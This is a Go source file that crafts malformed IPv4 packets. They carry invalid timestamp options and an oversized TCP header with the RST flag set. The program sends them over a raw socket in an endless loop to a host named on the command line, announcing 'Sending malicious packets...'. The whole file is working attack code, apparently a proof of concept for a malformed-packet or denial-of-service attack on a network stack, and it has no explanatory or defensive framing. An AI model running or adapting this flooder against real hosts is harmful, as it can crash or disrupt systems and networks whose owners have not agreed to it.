package main

import (
	"fmt"
	"net"
	"os"
	
	"golang.org/x/net/ipv4"

	"github.com/unixpickle/essentials"
)

const TCPProtocol = 6

func main() {
	
	dest, err := net.ResolveIPAddr("ip", os.Args[1])
	essentials.Must(err)
	
	var source *net.IPAddr
	
	if(len(os.Args) >2) {
		source, err = net.ResolveIPAddr("ip", os.Args[2])
		essentials.Must(err)
	} else {
		source = getLocalIP(dest)
	}

	conn, err := net.ListenIP("ip4:icmp", source)
	essentials.Must(err)
	rawConn, err := ipv4.NewRawConn(conn)
	essentials.Must(err)

	payload := makeLargeTCPHeader()
	header := makeHeader(dest.IP, makeInvalidIPOptions(), len(payload))
	essentials.Must(err)
	fmt.Println("Sending malicious packets...")
	for {
		if err := rawConn.WriteTo(header, payload, nil); err != nil {
			fmt.Println(err)
		}
	}
}

func getLocalIP(dest *net.IPAddr) *net.IPAddr {
	
	conn, err := net.Dial("udp", dest.String() + ":80")
	
	essentials.Must(err)
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	
	ipAddr, err := net.ResolveIPAddr("ip", localAddr.IP.String())
	essentials.Must(err)
	return ipAddr
}

func makeHeader(dest net.IP, options []byte, payloadSize int) *ipv4.Header {
	return &ipv4.Header{
		Version:  4,
		Len:      20 + len(options),
		TOS:      0,
		TotalLen: 20 + len(options) + payloadSize,
		TTL:      64,
		Protocol: TCPProtocol,
		Dst:      dest,
		Options:  options,
	}
}

func makeInvalidIPOptions() []byte {
	res := []byte{}
	for len(res) < 40 {
		// Add an invalid timestamp option.
		res = append(res, 0x44, 2, 13, 37)
	}
	return res
}

func makeLargeTCPHeader() []byte {
	tcpHeader := make([]byte, 64)
	// Source port
	tcpHeader[1] = 80
	// Dest port
	tcpHeader[3] = 80
	// Header length
	tcpHeader[12] = 0xf0
	// RST flag
	tcpHeader[13] = 4
	// Window size (woohoo)
	tcpHeader[15] = 1
	return tcpHeader
}
